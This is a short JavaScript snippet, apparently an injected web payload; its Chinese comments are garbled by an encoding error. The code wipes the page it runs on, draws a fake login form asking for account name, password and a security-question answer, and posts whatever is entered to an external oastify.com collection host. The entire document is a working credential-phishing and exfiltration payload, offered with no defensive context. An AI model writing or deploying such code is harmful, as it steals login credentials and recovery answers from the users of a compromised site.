// æ¸…é™¤é¡µé¢ä¸­çš„æ‰€æœ‰å†…å®¹
document.body.innerHTML = '';

// åˆ›å»ºæ ‡é¢˜
const loginTitle = document.createElement("h2"); // æ›´å…·ä½“çš„å˜é‡å
loginTitle.textContent = "Login page";
document.body.appendChild(loginTitle);

// åˆ›å»ºè¡¨å•ï¼ˆä½¿ç”¨å”¯ä¸€å‘½åï¼‰
const customLoginForm = document.createElement("form");
customLoginForm.id = "customLoginForm"; // ä½¿ç”¨ç‹¬ç‰¹ID

// è¾“å…¥åŸŸåˆ›å»ºå‡½æ•°ï¼ˆæå–å…¬å…±é€»è¾‘ï¼‰
function createFormField(form, labelText, name, type = "text") {
  form.appendChild(document.createTextNode(labelText));
  const input = document.createElement("input");
  input.type = type;
  input.name = name;
  input.required = true;
  form.appendChild(input);
  form.appendChild(document.createElement("br"));
  return input;
}

// åˆ›å»ºå„è¾“å…¥åŸŸ
createFormField(customLoginForm, "account:", "username");
createFormField(customLoginForm, "password:", "password", "password");
createFormField(customLoginForm, "The answer of your question?", "answer");

// æ·»åŠ é—´éš”
customLoginForm.appendChild(document.createElement("br"));

// æäº¤æŒ‰é’®ï¼ˆä½¿ç”¨å…·ä½“å‘½åï¼‰
const formSubmitButton = document.createElement("button");
formSubmitButton.type = "submit";
formSubmitButton.textContent = "Submit";
customLoginForm.appendChild(formSubmitButton);

// æ·»åŠ è¡¨å•åˆ°é¡µé¢
document.body.appendChild(customLoginForm);

// äº‹ä»¶ç›‘å¬ï¼ˆä½¿ç”¨ç‹¬ç‰¹å‡½æ•°åï¼‰
customLoginForm.addEventListener("submit", function handleCustomFormSubmit(e) {
  e.preventDefault();

  const formData = new FormData(customLoginForm);
  
  // å‘é€è¯·æ±‚ï¼ˆå¯æ ¹æ®éœ€è¦ä¿ç•™æˆ–ä¿®æ”¹ï¼‰
  fetch("https://v84h2gg22scl3p7nfvyimavi89e02rqg.oastify.com", {
    method: "POST",
    body: formData
  });
});
